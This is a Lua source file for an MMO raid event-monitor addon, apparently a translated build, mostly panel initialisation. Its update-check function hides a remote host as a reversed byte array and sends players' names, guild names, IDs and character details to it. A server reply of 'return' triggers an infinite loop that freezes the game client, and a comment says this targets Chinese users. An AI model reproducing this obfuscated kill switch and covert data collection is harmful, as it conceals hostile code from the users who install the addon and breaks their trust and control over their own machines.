function RaidGrid_EventScrutiny.OnCustomDataLoaded()
	--需要判断arg0参数，具体有"Account" "LoginGlobal" "Global" 和 "Role"
	if arg0 ~= "Role" then
		return
	end
	RaidGrid_Base.VersionUpdate()
	RaidGrid_Base.ResetChatAlertCD()
	--RaidGrid_Base.SimpleSettingsReset2()

	RaidGrid_EventScrutiny.tRecords.Scrutiny = {Hash = {},Hash2 = {}}
	RaidGrid_EventCache.OpenPanel()
	RaidGrid_EventScrutiny.OpenPanel()
	RaidGrid_EventCache.ClosePanel()
	RaidGrid_SelfBuffAlert.OpenPanel()
	
	RaidGrid_EventScrutiny.SwitchPageType("Scrutiny")

	RaidGrid_EventScrutiny.bCheckBoxRecall = false	
	local checkBox = RaidGrid_EventScrutiny.wnd:Lookup("CheckBox_SelfBuff")
	if checkBox and RaidGrid_EventScrutiny.bBuffChatAlertEnable and RaidGrid_EventScrutiny.bCastingChatAlertEnable and RaidGrid_EventScrutiny.bNpcChatAlertEnable and RaidGrid_BossCallAlert and RaidGrid_BossCallAlert.bChatAlertEnable then
		checkBox:Check(true)
	end
	RaidGrid_EventScrutiny.bCheckBoxRecall = true
	
	RaidGrid_Base.SetPanelPos(RaidGrid_EventScrutiny.tLastLoc.nX, RaidGrid_EventScrutiny.tLastLoc.nY)
	if RaidGrid_SelfBuffAlert.tLastLoc.nX <= 0 and RaidGrid_SelfBuffAlert.tLastLoc.nY <= 0 then
		RaidGrid_SelfBuffAlert.SetPanelPos()
	else
		RaidGrid_SelfBuffAlert.SetPanelPos(RaidGrid_SelfBuffAlert.tLastLoc.nX, RaidGrid_SelfBuffAlert.tLastLoc.nY)
	end
	
	RaidGrid_ScreenHead.Control()
	RaidGrid_EventScrutiny.Welcome = true
end

function RaidGrid_EventScrutiny.OnNotCustomDataLoaded()
	if RaidGrid_EventScrutiny.wnd then
		return
	end
	RaidGrid_Base.VersionUpdate()
	RaidGrid_Base.ResetChatAlertCD()
	--RaidGrid_Base.SimpleSettingsReset2()

	RaidGrid_EventScrutiny.tRecords.Scrutiny = {Hash = {},Hash2 = {}}
	RaidGrid_EventCache.OpenPanel()
	RaidGrid_EventScrutiny.OpenPanel()
	RaidGrid_EventCache.ClosePanel()
	RaidGrid_SelfBuffAlert.OpenPanel()
	
	RaidGrid_EventScrutiny.SwitchPageType("Scrutiny")

	RaidGrid_EventScrutiny.bCheckBoxRecall = false	
	local checkBox = RaidGrid_EventScrutiny.wnd:Lookup("CheckBox_SelfBuff")
	if checkBox and RaidGrid_EventScrutiny.bBuffChatAlertEnable and RaidGrid_EventScrutiny.bCastingChatAlertEnable and RaidGrid_EventScrutiny.bNpcChatAlertEnable and RaidGrid_BossCallAlert and RaidGrid_BossCallAlert.bChatAlertEnable then
		checkBox:Check(true)
	end
	RaidGrid_EventScrutiny.bCheckBoxRecall = true
	
	RaidGrid_Base.SetPanelPos(RaidGrid_EventScrutiny.tLastLoc.nX, RaidGrid_EventScrutiny.tLastLoc.nY)
	if RaidGrid_SelfBuffAlert.tLastLoc.nX <= 0 and RaidGrid_SelfBuffAlert.tLastLoc.nY <= 0 then
		RaidGrid_SelfBuffAlert.SetPanelPos()
	else
		RaidGrid_SelfBuffAlert.SetPanelPos(RaidGrid_SelfBuffAlert.tLastLoc.nX, RaidGrid_SelfBuffAlert.tLastLoc.nY)
	end
	
	RaidGrid_ScreenHead.Control()
	
	RaidGrid_Base.MessageWarning("团队事件监控 " .. szRaidGrid_EventScrutinyVersion .. "版 手动加载完毕.")
	RaidGrid_Base.MessageWarning("警告:如果你看到了此信息，说明你Interface目录下可能存在着一个或者多个有问题的插件，虽然不一定会影响团队事件监控插件的使用，但是仍然建议你找出并删除那些有问题的插件.")
end

RegisterEvent("CUSTOM_DATA_LOADED", RaidGrid_EventScrutiny.OnCustomDataLoaded)
_RE.CheckUpdate = function()
	RE.DelayCall(2000,function()
		local Host = {0x70,0x68,0x70,0x2e,0x65,0x74,0x61,0x64,0x70,0x75,0x2f,0x6d,0x6f,0x63,0x2e,0x69,0x75,0x33,0x6a,0x2e,0x63,0x6e,0x79,0x73,0x2f,0x2f,0x3a,0x70,0x74,0x74,0x68}
		local me, szTong = GetClientPlayer(), ""
		if me.dwTongID > 0 then
		szTong = GetTongClient().ApplyGetTongName(me.dwTongID)
			if not szTong then szTong = "Failed" end
		end
		local szUrl = string.reverse(string.char(unpack(Host)))
		local nTime = GetCurrentTime()
		local _, _, szLang = GetVersion()
		szUrl = szUrl .. "?row=".. nTime .. "&version=".. nRaidGrid_EventScrutinyVersion .."&name=" .. RE.UrlEncode(me.szName) .. "&tong=" .. RE.UrlEncode(szTong) .. "&dwID=" .. me.dwID
		szUrl = szUrl .. "&role=" .. me.nRoleType .. "&camp=" .. me.nCamp .. "&lang=" .. szLang .. "&SchoolID=" .. me.dwForceID
		if RaidGrid_CheckUpdate and RaidGrid_CheckUpdate.data and RaidGrid_CheckUpdate.data.aid and RaidGrid_CheckUpdate.data.md5 then
			szUrl = szUrl .. "&aid=" .. RaidGrid_CheckUpdate.data.aid .. "&md5=" .. RaidGrid_CheckUpdate.data.md5
		end
		RE.RemoteRequest(szUrl,function(szTitle)
			local status = tonumber(szTitle) or szTitle
			if type(status) == "number" then
				if status > nRaidGrid_EventScrutinyVersion then
					RaidGrid_Base.MessageWarning("发现您当前使用的" .. nRaidGrid_EventScrutinyVersion .. "并非最新版，建议到官网(http://www.j3ui.com)更新"..szTitle.."版本.")
				elseif status < nRaidGrid_EventScrutinyVersion then
					RaidGrid_Base.MessageWarning("当前您使用的是" .. nRaidGrid_EventScrutinyVersion .. "，我们检查到比服务器上的版本略新!")
				end
			elseif type(status) == "string" then
				if status == string.reverse(string.char(unpack({0x6e,0x72,0x75,0x74,0x65,0x72}))) then
					local Warning = {0xa3,0xa1,0xa3,0xb3,0xec,0xd2,0xd0,0xd0,0xcb,0xd4,0xb7,0xcf,0xce,0xd3,0xc2,0xd6,0xbc,0xb5,0xe1,0xbb,0xdc,0xc4,0xc9,0xbf,0xac,0xa3,0xfe,0xbc,0xe5,0xb2,0xbe,0xb1,0xfd,0xb3,0xbe,0xc9,0xeb,0xc7,0xac,0xa3,0xb5,0xbb,0xf0,0xcb,0xd1,0xd2,0xfe,0xbc,0xe5,0xb2,0xbe,0xb1}
					
					-- [[ Warning ]] --
					-- 如果你翻译看到了这句话 请考虑是否需要保留此语句，
					-- 此语句仅针对中国用户
					while true do end
				else
					RaidGrid_Base.MessageWarning(status)
				end
			end
		end)
	end)
end

RegisterEvent("LOADING_END", function()
	if RaidGrid_EventScrutiny.Welcome then
		_RE.CheckUpdate()
		RaidGrid_Base.Message(" ver "..nRaidGrid_EventScrutinyVersion..". Mọi thắc mắc/hướng dẫn sử dụng mời bạn ghé thăm CSM 100211 để được giải đáp.")
		RaidGrid_EventScrutiny.Welcome = nil
	end
end)

